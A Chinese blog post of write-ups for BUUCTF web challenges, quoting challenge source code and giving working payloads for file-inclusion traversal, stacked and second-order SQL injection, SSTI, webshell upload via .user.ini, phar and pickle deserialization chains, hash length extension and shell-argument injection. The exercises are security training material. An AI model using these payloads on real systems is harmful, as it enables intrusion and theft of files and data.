---
title: BUUCTF Web 练习记录
date: 2019-11-29 18:36:25
tags:
  - SQLi
  - 文件上传
  - SSRF
  - 反序列化
  - PHP
categories:
  - Web 安全
---

偶然发现的 BUUCTF，真的非常好用了。

<!--more-->

## [HCTF 2018]WarmUp

F12 发现 `source.php` 得源码：

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page .'?','?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page .'?','?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\"/>";
    }
?>
```

发现存在 `hint.php`：

```
flag not here, and flag in ffffllllaaaagggg
```

结合上述代码，可以确定是利用文件包含读取 `ffffllllaaaagggg` 文件。为此，我们需要提供 GET 参数 `file`。

注意到 `file` 参数的值会被经过如下处理：

```php
$_page = mb_substr(
                $page,
                0,
                mb_strpos($page .'?','?')
            );
```

那么如果我们在中间插入一个 `?`，就可以达到截断的效果。所以尝试 `?file=hint.php?ffffllllaaaagggg` 发现无法读取到内容，因此猜测 `hint.php?` 被当作了文件名的一部分，需要使用相对路径进行目录穿越：

```
?file=hint.php?../../../../../ffffllllaaaagggg
```

## [强网杯 2019] 随便注

单引号可以发现存在注入，但尝试注入时页面返回

```php
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

这说明无法通过常规手段进行注入，因此尝试堆叠注入：

```
1';show databases;
1';show tables;
```

得到需要的表名 `1919810931114514`，但是由于 `select` 等查询关键字被过滤，查字段内容需要另辟蹊径。这里使用了预处理语句：

```
1';sEt @poc=concat(char(115,101,108,101,99,116,32),'* from `1919810931114514`');prEpare poc from @poc;exEcute poc;#
```

注意这里可以使用 `char` 绕过、大小写绕过，并且纯数字表名需要用反引号包起来。

## [护网杯 2018]easy_tornado

我们需要计算的 hash 是 `md5(cookie_secret+md5(filename))`，已经获得了 flag 的文件名，还需要 `cookie_secret`。由于是 tornado 框架，可以尝试 SSTI。

修改 `filehash` 进入错误页面 `/error?msg=Error`，测试发现 `msg` 存在 SSTI，使用 `msg={{handler.settings}}` 即可获得 `cookie_secret`。最后计算 MD5 得 payload：

```
/file?filename=/fllllllllllllag&filehash=a47f809c580850840a5562488d72a3df
```

## [SUCTF 2019]EasySQL

源码泄露：

```php
<?php
    session_start();

    include_once "config.php";

    $post = array();
    $get = array();
    global $MysqlLink;

    //GetPara();
    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);
    if(!$MysqlLink){
        die("Mysql Connect Error!");
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die("Choose Database Error!");
    }

    foreach ($_POST as $k=>$v){
        if(!empty($v)&&is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=>$v){
        }
    }
    //die();
    ?>

<html>
<head>
</head>

<body>

<a> Give me your flag, I will tell you if the flag is right. </ a>
<form action=""method="post">
<input type="text"name="query">
<input type="submit">
</form>
</body>
</html>

<?php

    if(isset($post['query'])){
        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\"";
        //var_dump(preg_match("/{$BlackList}/is",$post['query']));
        if(preg_match("/{$BlackList}/is",$post['query'])){
            //echo $post['query'];
            die("Nonono.");
        }
        if(strlen($post['query'])>40){
            die("Too long.");
        }
        $sql = "select".$post['query']."||flag from Flag";
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));

    }

    ?>
```

从 sql 语句可以看出存在堆叠注入，且 `flag` 被 `||` 拼接在了输入的后面。因此一种办法是把管道变成连接符，然后查询 `1||flag`：

```
1; set sql_mode=pipes_as_concat;select 1
```

另一种办法是直接输入 `*,1`，从而构造 `select *,1||flag from Flag`，这里的 `||` 就是默认的或运算。

## [HCTF 2018]admin

注册时输入 unicode 字符会报错，由于开启了 debug 模式，直接可以拿到 python 的 shell，从 `index.html` 中读 flag。这个应该是 BUU 平台的非预期。

实际上，本题预期解是利用 Unicode 同形字，注册 `ᴀdmin` 并登陆，然后修改密码即可修改 `admin` 的密码，但是同样出现了很多非预期，具体参考 [出题人题解](https://www.ckj123.com/?p=147)。

## [RoarCTF 2019]Easy Calc

首页可以发现 js 代码，也就是自定义的 waf：

```js
$('#calc').submit(function(){
    $.ajax({
        url:"calc.php?num="+encodeURIComponent($("#content").val()),
        type:'GET',
        success:function(data){
            $("#result").html(`<div class="alert alert-success">
        <strong> 答案:</strong>${data}
        </div>`);
        },
        error:function(){
            alert(" 这啥? 算不来!");
        }
    })
    return false;
})
```

可以发现有 `calc.php`，访问直接得到源码：

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = ['', '\t', '\r', '\n','\'','"','`','\[','\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/'. $blackitem .'/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo'.$str.';');
}
?>
```

绕过 php 黑名单本身不难，但是 waf 中会先进行一次 `encodeURIComponent`。这里用到的绕过 waf 技巧就是用 ` num` 参数而非 `num` 参数，这样做可以成功的原因在于 php 会尝试将传入的参数变为合法变量名，即 strip 掉首尾空格、加下划线等等，因此 ` num` 就会被处理成 `num`，成功进入 `else` 逻辑，剩下的就是绕黑名单了：

```
/calc.php?%20num=var_dump(scandir(chr(47)))
```

可以发现 flag 文件 `/f1agg`，同样方法读出即可：

```
/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

## [强网杯 2019] 高明的黑客

提供了 `www.tar.gz`，里面有 3000 + 个 php 文件，都含有类似一句话的部分，但是大多不能用。需要写脚本找到能用的一句话木马：

```py
import os
import re
import requests

filenames = os.listdir('/var/www/html/src')
pattern = re.compile(r"\$_[GEPOST]{3,4}\[.*\]")

for name in filenames:
    print(name)
    with open('/var/www/html/src/'+name,'r') as f:
        data = f.read()
    result = list(set(pattern.findall(data)))

    for ret in result:
        try:
            command = 'uname'
            flag = 'Linux'
            if 'GET' in ret:
                passwd = re.findall(r"'(.*)'",ret)[0]
                r = requests.get(url='http://localhost/'+ name +'?'+ passwd +'='+ command)
                if flag in r.text:
                    print('GET /{}?{}=cat /flag'.format(name,passwd))
                    break
            elif 'POST' in ret:
                passwd = re.findall(r"'(.*)'",ret)[0]
                r = requests.post(url='http://localhost/'+ name,data={passwd:command})
                if flag in r.text:
                    print('POST /{}?{}=cat /flag'.format(name,passwd))
                    break
        except:
            pass
```

## [SUCTF 2019]CheckIn

可以上传文件，但是会对后缀名、文件头进行检查，同时文件中不能存在 `<?`。后者用 `<script language="php">` 就可以绕过，前者可以上传图片马。随后就需要我们去包含这个图片马。

可以看到上传的文件目录是固定的，同目录下原本就存在 `index.php`。那么可以尝试上传 `.user.ini`，令 `index.php` 中包含上传的图片马。

如下编写 `.user.ini`：

```
GIF89a
auto_prepend_file=1.jpg
```

这样以后，再访问上传目录下的 `index.php` 即可。

## [网鼎杯 2018]Fakebook

首先通过 `robots.txt` 发现 `user.php.bak`：

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

可以发现输入的 `blog` 处存在 SSRF，并且对 `blog` 字符串的模式做了限制。

先随便注册一个账号，查看账号信息会访问到 `view.php?no=1`，这里存在 SQL 注入。

```
no=1 and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),1)--

no=1 and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'),1)--

no=1 and updatexml(1,concat('~',(select data from users),'~'),1)--
```

可以发现存在 `no,username,passwd,data` 这些字段，并且 `data` 字段存放了序列化的 User 对象。

那么我们可以构造一个 `User` 使得他的 `blog` 指向 flag 文件。这样就可以绕过 `user.php` 的检查。

构造序列化对象：

```php
$a = new UserInfo('merc','10','file:///var/www/html/flag.php');
echo serialize($a);
```

另外 `union select` 被过滤，需要注释绕过。

```
no=-1'union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"merc";s:3:"age";i:10;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'--
```

## [De1CTF 2019]SSRF Me

iec

```python
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp =="Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param",""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param",""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0')
```

两种操作：`scan` 写入 `result.txt`，`read` 读文件。生成签名时将 `secret_key` 放在最前面，因此可以通过哈希长度扩展攻击在末尾添加一个 `read` 操作。这样就可以先把 `flag.txt` 写入 `result.txt` 再读出来。

为了读到 `flag.txt`，很容易想到 `file` 协议，但是在 `waf` 中过滤了 `file` 和 `gopher` 协议。这里可以利用 `urllib` 库中的特殊协议 `local-file` 来读文件，造成 SSRF。

```py
import requests
import urllib
import hashpumpy

base = 'http://0230c9c3-8270-4e74-9786-e6ab55d01eeb.node3.buuoj.cn/'
url = 'local-file:flag.txt'
r = requests.get(base +'geneSign?param='+ url)
print(r.text)
hashcode = hashpumpy.hashpump(r.text, url+'scan','read', 16)
print(hashcode)

cookies = {
    'sign': hashcode[0],
    'action': urllib.parse.quote(hashcode[1][len(url):])
}
r = requests.get(base +'De1ta?param='+url, cookies=cookies)
print(r.text)
```

## [RoarCTF 2019]Easy Java

容易发现任意文件下载漏洞，我们可以下载 `WEB-INF/web.xml`，注意必须通过 POST 方式。可以发现存在 `FlagController`，然后去下载 `FlagController`：

```
filename=WEB-INF/classes/com/wm/ctf/FlagController.class
```

jd-gui 反编译可以发现 flag 的 base64 编码。

## [0CTF 2016]piapiapia

扫目录得 `www.zip`，发现正常注册登陆后可以修改档案，随后查看档案时存在反序列化操作，而其中图片是通过 `file_get_contents` 获取的，可以用来读关键文件 `config.php`。

```php
$profile['phone'] = $_POST['phone'];
$profile['email'] = $_POST['email'];
$profile['nickname'] = $_POST['nickname'];
$profile['photo'] = 'upload/' . md5($file['name']);
```

```php
$profile = unserialize($profile);
$phone = $profile['phone'];
$email = $profile['email'];
$nickname = $profile['nickname'];
$photo = base64_encode(file_get_contents($profile['photo']));
```

但是在更新档案时，`photo` 字段前会拼接一个 `upload/` 导致无法读到 `config.php`。那么我们可以考虑向 `nickname` 注入序列化字符串的末尾部分，使得反序列化时忽略掉原本的 `photo` 字段。

但是对于 `nickname` 又存在过滤：

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');
```

不过绕过很简单，数组绕过即可。

最后，为了注入 `photo`，我们需要额外添加：

```
";}s:5:"photo";s:10:"config.php
```

共 31 个字符，因此我们必须让 `nickname` 在被序列化之前，长度增加 31，否则我们新增的部分就不会被读入。幸运的是，我们有 `filter` 函数：

```php
public function filter($string) {
    $escape = array('\'','\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape,'_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
        return preg_replace($safe,'hacker', $string);
}
```

可以发现它会将 `where` 替换为 `hacker`，使得字符串长度 + 1，那么我们重复该过程 31 次即可。

最终 payload：

```
------WebKitFormBoundary8V1KsQLRGLqfB6An
Content-Disposition: form-data; name="phone"

12345678901
------WebKitFormBoundary8V1KsQLRGLqfB6An
Content-Disposition: form-data; name="email"

admin@admin.com
------WebKitFormBoundary8V1KsQLRGLqfB6An
Content-Disposition: form-data; name="nickname[]"

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php
------WebKitFormBoundary8V1KsQLRGLqfB6An
Content-Disposition: form-data; name="photo"; filename="1.png"
Content-Type: image/png

config.php
------WebKitFormBoundary8V1KsQLRGLqfB6An--
```

## [BUUCTF 2018]Online Tool

[参考文章](https://paper.seebug.org/164/)。

简单来说，`escapeshellarg` 会对传入参数中的单引号进行转义，然后将单引号两边的内容用 `''` 包起来；而 `escapeshellcmd` 会对转义符 `\` 以及不成对的单引号进行转义。那么先 `escapeshellarg` 再 `escapeshellcmd` 就会造成单引号逃逸。

payload：

```
?host='<?php echo phpinfo();?> -oG 1.php '
```

经过 `escapeshellarg`：

```
?host=''\' '<?php echo phpinfo();?> -oG 1.php'\'''
```

经过 `escapeshellcmd`：

```
?host=''\\' '\<\?php echo phpinfo\(\)\;\?\> -oG 1.php'\\'''
```

然后访问沙箱即可。

## [SUCTF 2019]Pythonginx

```py
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222" + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split('')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl, timeout=2).read()
    else:
        return "我扌 your problem? 333"
```

题目不允许主机名为 `suctf.cc`，但是给了提示 `h.encode('idna'.decode('utf-8))`，可以查到 urllib 相关漏洞，利用 idna 字符 `℆` 即可绕过主机名过滤，使得最终解码得到主机名是 `suctf.cc`。

然后，题目还提示了 nginx，因此可以想到用 `file` 协议读取 nginx 配置文件，得到 flag 位置，恰好也位于 `/usr` 目录下，因此直接读即可。

## [CISCN2019 华北赛区 Day1 Web1]Dropbox

[参考](https://paper.seebug.org/680/)

注册后随便上传个文件，然后下载，抓包发现可以改成别的文件，例如 `/var/www/html/index.php`：

```php
<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```

这里创建了 `FileList` 对象，调用了两个方法。

然后下载 `class.php`：

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password ."SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password ."SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container"class="container"><div class="table-responsive"><table id="table"class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col"class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col"class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center"filename="'. htmlentities($filename) . '"><a href="#"class="download">涓嬭浇 </a> / <a href="#"class="delete"> 鍒犻櫎</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', 'KB', 'MB', 'GB', 'TB');
        for ($i = 0; $size>= 1024 && $i <4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

我们注意到，`FileList` 并没有刚才调用的两个方法，但是却有 `__call` 魔术方法，因此会去调用 `File` 的 `name` 和 `size` 方法。这里提示我们使用 `__call` 调用 `File` 的其他方法来进行漏洞利用，例如 `close` 就是不错的选择。

而在下载和删除时，会分别使用 `download.php` 和 `delete.php`，这两个文件也下载下来：

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() .":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) <40 && $file->open($filename) && stristr($filename,"flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) <40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

可以看到我们不能通过任意文件下载去下载 flag 文件。而在删除时，关键在于调用了 `detele` 函数，这会触发 `unlink`。`unlink` 在用 `phar://` 伪协议解析文件时会进行反序列化，结合刚才的魔术方法 `__call`，我们容易想到利用 phar 反序列化来读 flag。

我们已经有 `FileList->__destruct` 方法打印 `__call` 的结果。接下来，读 flag 显然只能用 `File` 的 `close` 方法，为了调用这个方法，我们需要构造形如 `FileList->__call("close")` 的调用。

搜索字符串 `close`，可以发现代码中还有一处 `close` 调用，位于 `User->__destruct` 中，本来是用于关闭数据库连接，但我们可以设置 `db` 为 `FileList` 对象从而达到目的。最后设置 `File` 对象的 `filename` 为 `/flag.txt`。

由于我们使用了 `unlink`，所以会自动调用 `User->__destruct`，至此 pop 链构造完成。

```php
<?php

class User
{
    public $db;
}
class FileList
{
    private $files;
    public function __construct() {
        $this->files = array(new File());
    }
}
class File
{
    public $filename = "/flag.txt";
}

$fl = new FileList();
$u = new User();
$u->db = $fl;

$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->addFromString("1.txt", "text");
$phar->setMetadata($u);
$phar->stopBuffering();

?>
```

然后将 `php.ini` 中的 `phar.readonly` 设为 `Off`，运行得到 `1.phar`，上传并抓包，更改文件名为 `1.gif`，更改 `Content-Type` 为 `image/gif` 即可成功上传。最后删除，更改文件名为 `phar://1.gif`，触发 `unlink` 读取 flag。

## [ASIS 2019]Unicorn shop

本题需要花费 1337 购买超级独角兽，但输入的价格只能是一个字符。查看源代码发现提示和 UTF8 相关，因此去查询 Unicode 中数值大于 1337 的字符的 UTF8 编码，举个例子：

```
id=4&price=%e1%8d%bc
```

这个字符代表一万，因此可以购买。[查询网站](https://www.compart.com/en/unicode/)

## [CISCN2019 华北赛区 Day1 Web2]ikun

首先需要找到 `lv6`，页数很多，写脚本跑一下：

```py
import requests

base = 'http://92a45198-65ac-407a-afbb-530a083474e9.node3.buuoj.cn/shop?page='

for i in range(1,2000):
    url = base + str(i)
    r = requests.get(url)
    if 'lv6.png' in r.text:
        print(i)
        break
```

发现在 181 页，点击购买发现钱不够但是存在折扣，因此抓包修改折扣为非常小的数字，进入 `b1g_m4mber` 页面，提示说只有 admin 可以访问。

抓包发现存在一个长度看起来很短的 jwt，扔到 `c_jwt_cracker` 里跑出密钥 `1Kun`，从而可以到 `jwt.io` 上伪造 `admin` 身份。

随后多出了一键成为大会员的功能，但是点击没有用，查看源代码得到源码。经过代码审计后，发现在 `Admin.py` 处存在 pickle 反序列化：

```py
@tornado.web.authenticated
def post(self, *args, **kwargs):
    try:
        become = self.get_argument('become')
        p = pickle.loads(urllib.unquote(become))
        return self.render('form.html', res=p, member=1)
    except:
        return self.render('form.html', res='This is Black Technology!', member=0)
```

我们可以借助其魔术方法 `__reduce__` 来执行 python 代码。[参考](https://github.com/RafeKettler/magicmethods)

注意 pickle 不能跨 python 版本，这里采用 python2：

```py
import pickle
import urllib

class payload(object):
    def __reduce__(self):
        return (eval, ('open("/flag.txt","r").read()',))

p = pickle.dumps(payload())
print urllib.quote(p)
```

即可生成 URL 编码的序列化数据，填入 `become` 字段即可。

```
c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A.
```

## [GYCTF2020] Blacklist

存在过滤语句 `return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`，无法 `select`，可以考虑堆叠注入：

```
-1';show tables;#
-1';show columns from FlagHere;#
```

可以得到列名为 `flag`，然后通过 `HANDLER` 语法读取 flag。

```
-1';handler FlagHere open; handler FlagHere read first; handler close;#
```

## [安洵杯 2019]easy_serialize_php

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function =='highlight_file'){
    highlight_file('index.php');
}else if($function =='phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function =='show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

本题的关键问题在于，对于序列化后的数据进行过滤，导致反序列化时出错。

首先存在明显的变量覆盖，显然可以覆盖的变量只有 `$_SESSION`，随后注意到如果指定 `img_path` 那么 `$SESSION[img]` 将被哈希，变得不可控。而下方 `file_get_contents` 又提醒我们必须控制 `img` 字段，因此需要通过反序列化字符逃逸来实现。

先通过提示在 `phpinfo` 中发现 `d0g3_f1ag.php` 文件，这就是我们要放进 `img` 的文件了。随后利用 `filter` 函数的过滤功能吞掉 24 个字符，使得反序列化时多读入后 24 字符并舍弃后面的所有内容。具体地说，构造：

```
_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}
```

那么序列化后数据变为：

```
a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
```

再经过 `filter`，变成：

```
a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
```

此时，`user` 字段向后读 24 字符，其值为 `";s:8:"function";s:59:"a`，随后是我们控制的 `img` 字段和 `dd` 字段（注意需满足长度为 59），`}` 后的内容被忽略。此时我们就成功控制了 `img`，读到了 `d0g3_f1ag.php`。文件内容指向另一个文件，同样方法读取即可。

## [网鼎杯 2018]Comment

存在 `.git` 泄露，`GitHack` 发现恢复的文件不全，然后通过 `git log --reflog` 发现了一个 `stashed` 的记录，用 `git reset --hard xxx` 回滚到该记录得到完整代码：

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] !='yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
    $category = mysql_fetch_array($result)['category'];
    $content = addslashes($_POST['content']);
    $sql = "insert into comment
            set category = '$category',
                content = '$content',
                bo_id = '$bo_id'";
    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

插入数据时进行转义，但获取 `category` 时没有转义直接拼接到了 sql 语句中执行，因此可以二次注入。

首先是发帖，设置 `category` 为 `', content=user(),/*`，那么 sql 语句变成

```sql
insert into board set category = '', content=user(),/*', title ='1', content ='2'
```

然后评论 `*/#`，sql 语句为：

```sql
insert into comment set category = '', content=user(),/*', content ='*/#', bo_id ='1'
```

则评论内容中就会显示当前用户为 `root`，随后查看 `/etc/passwd` 发现存在 `www` 用户，再查看 `/home/www/.bash_history` 发现存在 `.DS_Store` 文件。

随后查看 `.DS_Store` 文件：

```
',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
```

解码得到 `flag` 文件名：`flag_8946e1ff1ee3e40f.php`。同样方法读取即可。